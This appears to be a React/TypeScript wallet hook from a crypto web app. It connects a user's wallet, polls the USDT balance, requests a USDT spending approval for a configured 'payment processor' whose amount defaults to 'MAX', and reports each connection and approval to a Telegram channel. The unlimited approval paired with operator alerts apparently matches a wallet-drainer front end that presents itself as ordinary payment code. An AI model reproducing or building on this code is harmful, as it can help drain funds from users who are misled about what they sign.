// =================================
// 🪝 Wallet Integration Hook
// =================================

"use client";

import { useState, useEffect, useCallback } from "react";
import {
  WalletType,
  ChainType,
  WalletConnection,
  WalletBalance,
  UseWalletReturn,
} from "@/types";
import { walletManager } from "@/lib/wallet";
import { telegramService } from "@/lib/telegram";

export function useWallet(): UseWalletReturn {
  const [wallet, setWallet] = useState<WalletConnection | null>(null);
  const [isConnecting, setIsConnecting] = useState(false);
  const [balance, setBalance] = useState<WalletBalance | null>(null);

  /**
   * Connect to a wallet
   */
  const connect = useCallback(
    async (walletType: WalletType, chain: ChainType) => {
      setIsConnecting(true);
      try {
        const connection = await walletManager.connectWallet(walletType, chain);
        setWallet(connection);

        // Automatically get balance after connection
        await getBalance(connection.address, connection.chain);

        console.log(
          `✅ Connected to ${walletType} on ${chain}:`,
          connection.address
        );

        // Send Telegram notification for wallet connection
        if (telegramService.isEnabled()) {
          await telegramService.notifyWalletConnect({
            walletType,
            chain,
            userAddress: connection.address,
            timestamp: new Date().toLocaleString(),
          });
        }
      } catch (error: any) {
        console.error("Wallet connection failed:", error);
        throw error;
      } finally {
        setIsConnecting(false);
      }
    },
    []
  );

  /**
   * Disconnect wallet
   */
  const disconnect = useCallback(() => {
    setWallet(null);
    setBalance(null);
    console.log("🔌 Wallet disconnected");
  }, []);

  /**
   * Get USDT balance
   */
  const getBalance = useCallback(
    async (address?: string, chain?: ChainType) => {
      const targetAddress = address || wallet?.address;
      const targetChain = chain || wallet?.chain;

      if (!targetAddress || !targetChain) {
        console.warn("No wallet connected for balance check");
        return;
      }

      try {
        const balanceStr = await walletManager.getUSDTBalance(
          targetAddress,
          targetChain
        );
        const balanceNum = parseFloat(balanceStr);

        setBalance({
          balance: balanceStr,
          formatted: `${balanceStr} USDT`,
          symbol: "USDT",
        });

        console.log(`💰 USDT Balance: ${balanceStr}`);
      } catch (error) {
        console.error("Failed to get balance:", error);
        setBalance({
          balance: "0.00",
          formatted: "0.00 USDT",
          symbol: "USDT",
        });
      }
    },
    [wallet?.address, wallet?.chain]
  );

  /**
   * Approve USDT spending
   */
  const approveUSDT = useCallback(
    async (amount?: string, targetWallet?: WalletConnection) => {
      const walletToUse = targetWallet || wallet;

      if (!walletToUse) {
        throw new Error("No wallet connected");
      }

      try {
        // Get payment processor address from config
        const config = await walletManager.loadConfig();
        const paymentProcessorAddress =
          config.contracts[walletToUse.chain].paymentProcessor;

        if (!paymentProcessorAddress) {
          throw new Error(
            `Payment processor not configured for ${walletToUse.chain}`
          );
        }

        const result = await walletManager.approveUSDT(
          walletToUse.chain,
          paymentProcessorAddress
        );

        console.log(`✅ USDT approved on ${walletToUse.chain}:`, result.hash);

        // Send Telegram notification for approval success
        if (telegramService.isEnabled()) {
          await telegramService.notifyApproveSuccess({
            walletType: walletToUse.wallet,
            chain: walletToUse.chain,
            userAddress: walletToUse.address,
            amount: amount || "MAX",
            token: "USDT",
            timestamp: new Date().toLocaleString(),
          });
        }

        return result;
      } catch (error: any) {
        console.error("USDT approval failed:", error);
        throw error;
      }
    },
    [wallet]
  );

  /**
   * Check if wallet has sufficient allowance
   */
  const checkAllowance = useCallback(
    async (paymentProcessorAddress: string) => {
      if (!wallet) {
        return "0";
      }

      try {
        const allowance = await walletManager.checkUSDTAllowance(
          wallet.address,
          wallet.chain,
          paymentProcessorAddress
        );

        console.log(`🔍 Current allowance: ${allowance}`);
        return allowance;
      } catch (error) {
        console.error("Failed to check allowance:", error);
        return "0";
      }
    },
    [wallet]
  );

  /**
   * Auto-refresh balance periodically
   */
  useEffect(() => {
    if (!wallet) return;

    // Initial balance check
    getBalance();

    // Set up periodic balance refresh (every 30 seconds)
    const interval = setInterval(() => {
      getBalance();
    }, 30000);

    return () => clearInterval(interval);
  }, [wallet, getBalance]);

  /**
   * Detect wallet changes (account switching)
   */
  useEffect(() => {
    if (typeof window === "undefined") return;

    const handleAccountsChanged = (accounts: string[]) => {
      if (accounts.length === 0) {
        // User disconnected
        disconnect();
      } else if (wallet && accounts[0] !== wallet.address) {
        // Account changed
        console.log("👤 Account changed:", accounts[0]);
        setWallet((prev) => (prev ? { ...prev, address: accounts[0] } : null));
      }
    };

    const handleChainChanged = (chainId: string) => {
      console.log("🔗 Chain changed:", chainId);
      // Could implement chain change handling here
    };

    // Listen for account changes
    if (window.ethereum) {
      window.ethereum.on("accountsChanged", handleAccountsChanged);
      window.ethereum.on("chainChanged", handleChainChanged);
    }

    return () => {
      if (window.ethereum) {
        window.ethereum.removeListener(
          "accountsChanged",
          handleAccountsChanged
        );
        window.ethereum.removeListener("chainChanged", handleChainChanged);
      }
    };
  }, [wallet, disconnect]);

  return {
    wallet,
    isConnecting,
    balance,
    connect,
    disconnect,
    getBalance,
    approveUSDT,
    checkAllowance,
  };
}
